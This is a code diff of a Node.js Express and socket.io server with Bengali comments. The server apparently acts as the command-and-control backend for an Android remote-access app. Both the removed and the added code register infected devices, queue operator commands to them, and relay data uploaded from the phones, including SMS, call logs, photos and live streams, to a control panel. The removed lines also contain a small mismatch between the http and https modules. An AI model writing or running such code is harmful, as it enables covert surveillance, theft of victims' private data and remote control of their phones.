@@ -1,69 +1,49 @@
 const express = require('express');
-const https = require('https');
+const http = require('http');
 const { Server } = require('socket.io');
 const path = require('path');
+const cors = require('cors');
 
 const app = express();
+app.use(cors());
 const server = http.createServer(app);
+
+// Render এর জন্য মেমোরি লিমিট সেট করা হয়েছে
 const io = new Server(server, { 
     cors: { origin: "*" },
-    maxHttpBufferSize: 1e8 // 100MB support
+    maxHttpBufferSize: 1e7 
 });
 
 const PORT = process.env.PORT || 3000;
 
 app.use(express.static(path.join(__dirname, 'public')));
-app.use(express.json({ limit: '100mb' }));
+app.use(express.json({ limit: '10mb' }));
 
 let devices = {}; 
 
-// --- APK Connectivity API ---
-
-// ১. হার্টবিট এবং কমান্ড আদান-প্রদান
-app.post('/api/ping', (req, res) => {
-    const { deviceId, status } = req.body;
-    if (deviceId) {
-        if (!devices[deviceId]) devices[deviceId] = { commands: [], lastSeen: '' };
-        devices[deviceId].info = status; 
-        devices[deviceId].lastSeen = new Date().toLocaleTimeString();
-        
-        // প্যানেলে ডিভাইস আপডেট পাঠানো
-        io.emit('update_list', { deviceId, info: status });
-        
-        // অ্যাপের জন্য কমান্ড পাঠানো
-        const cmdToSend = devices[deviceId].commands.splice(0);
-        res.json({ commands: cmdToSend });
-    } else res.status(400).send();
-});
-
-// ২. ডাটা এবং ফাইল আপলোড (SMS, Call Logs, Photos, etc.)
-app.post('/api/upload', (req, res) => {
-    const { deviceId, type, data, fileName } = req.body;
-    // সরাসরি প্যানেলে পাঠানো
-    io.emit('new_incoming_data', { deviceId, type, data, fileName });
-    console.log(`[ALERTER] ${type} received from ${deviceId}`);
-    res.json({ status: 'success' });
-});
-
-// ৩. লাইভ স্ট্রিমিং রুট (ইভেন্ট নাম ফিক্স করা হয়েছে)
-app.post('/api/stream', (req, res) => {
-    const { deviceId, streamType, buffer } = req.body;
-    // প্যানেলের 'new_incoming_data' ইভেন্টের সাথে মিল রাখা হয়েছে
-    io.emit('new_incoming_data', { deviceId, type: streamType, data: buffer });
-    res.status(200).send();
-});
-
-// --- Dashboard Control Logic ---
 io.on('connection', (socket) => {
-    console.log('Admin Authenticated');
+    console.log('Connected:', socket.id);
 
-    socket.on('send_cmd', ({ id, cmd, payload }) => {
-        if (devices[id]) {
-            // কমান্ড কিউতে রাখা যা পরবর্তী Ping-এ অ্যাপ পাবে
-            devices[id].commands.push({ action: cmd, ...payload });
-            console.log(`[CONTROL] ${cmd} assigned to ${id}`);
+    // অ্যাপ থেকে ডাটা গ্রহণ
+    socket.on('update_list', (data) => {
+        const { deviceId, info } = data;
+        if (deviceId) {
+            devices[deviceId] = { socketId: socket.id, info, lastSeen: new Date().toLocaleTimeString() };
+            io.emit('device_online', { deviceId, info, lastSeen: devices[deviceId].lastSeen });
         }
+    });
+
+    // প্যানেল থেকে কমান্ড পাঠানো
+    socket.on('send_cmd', (data) => {
+        io.emit('receive_cmd', data); 
+    });
+
+    // অ্যাপ থেকে আসা ফাইল/ইমেজ প্যানেলে পাঠানো
+    socket.on('new_incoming_data', (data) => {
+        io.emit('new_incoming_data', data);
     });
 });
 
-server.listen(PORT, () => console.log(`SYSTEM MASTER SERVER ACTIVE: PORT ${PORT}`));
+server.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+});
